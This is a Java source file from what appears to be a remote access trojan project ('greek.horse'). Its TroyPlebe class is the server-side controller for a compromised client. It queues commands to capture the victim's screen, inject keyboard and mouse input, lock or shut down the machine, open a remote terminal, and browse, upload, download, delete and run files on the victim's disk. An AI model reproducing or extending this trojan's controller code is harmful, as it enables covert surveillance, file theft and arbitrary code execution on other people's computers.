package greek.horse.server.troyStructure;

import greek.horse.models.*;
import greek.horse.server.troyStructure.request.RecurrentTroyRequest;
import greek.horse.server.troyStructure.request.TroyRequest;
import greek.horse.server.troyStructure.request.UniqueTroyRequest;
import greek.horse.server.ui.controllers.tasks.ChatTask;
import greek.horse.server.ui.controllers.tasks.MonitorDesktopTask;
import greek.horse.server.ui.controllers.tasks.TerminalTask;

import java.io.Serializable;
import java.nio.file.Path;
import java.util.*;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.atomic.AtomicBoolean;

public class TroyPlebe {
    private final String id;
    private String title;
    private final AtomicBoolean running = new AtomicBoolean(true);
    private CopyOnWriteArrayList<TroyRequest> requests = new CopyOnWriteArrayList<>();
    private static final Serializable EMPTY = "";

    private ChatTask chatTask = new ChatTask(this);
    private MonitorDesktopTask monitorDesktopTask = new MonitorDesktopTask(this);
    private TerminalTask terminalTask = new TerminalTask(this);

    public TroyPlebe(String id) {
        this.id = id;
    }

    public void setRunning(boolean value) {
        this.running.set(value);
        if (!running.get()) {
            requests.clear();
            new Thread(() -> {
                try {
                    Thread.sleep(30 * 1000);
                    requests = null;
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }).start();
        }
    }

    public void removeRequest(UniqueTroyRequest req) {
        requests.remove(req);
    }

    public UniqueTroyRequest getNetInfo() {
        UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunction.NET_INFO, true);
        requests.add(req);
        return req;
    }

    public UniqueTroyRequest getDisconnect() {
        UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunction.DISCONNECT, false);
        requests.add(req);
        return req;
    }

    public void doStop() {
        UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunction.STOP, false);
        requests.add(req);
    }

    public void doToggleLock(boolean lock) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, lock, RequestFunction.LOCK, false);
        requests.add(req);
    }

    public RecurrentTroyRequest startScreenCapture(MonitorDesktopWrapper wrapper) {
        RecurrentTroyRequest req = new RecurrentTroyRequest(wrapper, RequestFunction.DESKTOP_START);
        requests.add(req);
        return req;
    }

    public void sendUserInputs(ArrayList<UserInput> inputs) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, inputs, RequestFunction.USER_INPUT, false);
        requests.add(req);
    }

    public boolean haveRequest(UniqueTroyRequest req) {
        return requests.contains(req);
    }

    public AtomicBoolean getRunning() {
        return running;
    }

    public String getId() {
        return id;
    }

    public List<TroyRequest> getRequests() {
        return Collections.unmodifiableList(requests);
    }

    public UniqueTroyRequest getDrives() {
        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(BrowserTicketType.LOAD_DRIVES), RequestFunction.FILES, true);
        requests.add(req);
        return req;
    }

    public UniqueTroyRequest getFiles(Path dir) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(dir.toString(), BrowserTicketType.LOAD_FILES), RequestFunction.FILES, true);
        requests.add(req);
        return req;
    }

    public UniqueTroyRequest runFile(Path path) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(path.toString(), BrowserTicketType.RUN), RequestFunction.FILES, true);
        requests.add(req);
        return req;
    }

    public UniqueTroyRequest uploadFile(Path path, String fileName, byte[] bytes) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(path.toString(), BrowserTicketType.UPLOAD, fileName, bytes), RequestFunction.FILES, true);
        requests.add(req);
        return req;
    }

    public UniqueTroyRequest getKnownFolders() {
        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(BrowserTicketType.KNOWN_FOLDERS), RequestFunction.FILES, true);
        requests.add(req);
        return req;
    }

    public UniqueTroyRequest deleteFile(Path path) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(path.toString(), BrowserTicketType.DELETE), RequestFunction.FILES, true);
        requests.add(req);
        return req;
    }

    public UniqueTroyRequest downloadFile(Path path) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(path.toString(), BrowserTicketType.DOWNLOAD), RequestFunction.FILES, true);
        requests.add(req);
        return req;
    }

    public TroyRequest startTerminal() {
        RecurrentTroyRequest req = new RecurrentTroyRequest(EMPTY, RequestFunction.TERMINAL_START);
        requests.add(req);
        return req;
    }

    public Object startChat() {
        RecurrentTroyRequest req = new RecurrentTroyRequest(EMPTY, RequestFunction.CHAT_START);
        requests.add(req);
        return req;
    }

    public void sendTerminalCommand(String command) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, command, RequestFunction.TERMINAL_COMMAND, false);
        requests.add(req);
    }

    public void sendChatMessage(String message) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, message, RequestFunction.CHAT_MESSAGE, false);
        requests.add(req);
    }

    public void releaseRequest(RecurrentTroyRequest request) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, request.getTicket().getId(), RequestFunction.RELEASE, false);
        requests.add(req);
        request.getReleased().set(true);
    }

    public void refreshDesktop(MonitorDesktopWrapper wrapper) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, wrapper, RequestFunction.DESKTOP_REFRESH, false);
        requests.add(req);
    }

    public void turnOff() {
        UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunction.TURN_OFF, false);
        requests.add(req);
    }

    public UniqueTroyRequest getMonitorCount() {
        UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunction.MONITOR_COUNT, true);
        requests.add(req);
        return req;
    }



    @Override
    public String toString() {
        return "TroyPlebe{" +
                "id=" + id +
                ", running=" + running.get() +
                ", requests size =" + requests.size() +
                '}';
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (o == null || getClass() != o.getClass()) return false;
        TroyPlebe troyPlebe = (TroyPlebe) o;
        return id.equals(troyPlebe.id);
    }

    @Override
    public int hashCode() {
        return Objects.hash(id);
    }

    public String getTitle() {
        return title;
    }

    public void setTitle(String title) {
        this.title = title;
    }

    public ChatTask getChatTask() {
        return chatTask;
    }

    public MonitorDesktopTask getMonitorDesktopTask() {
        return monitorDesktopTask;
    }

    public TerminalTask getTerminalTask() {
        return terminalTask;
    }
}
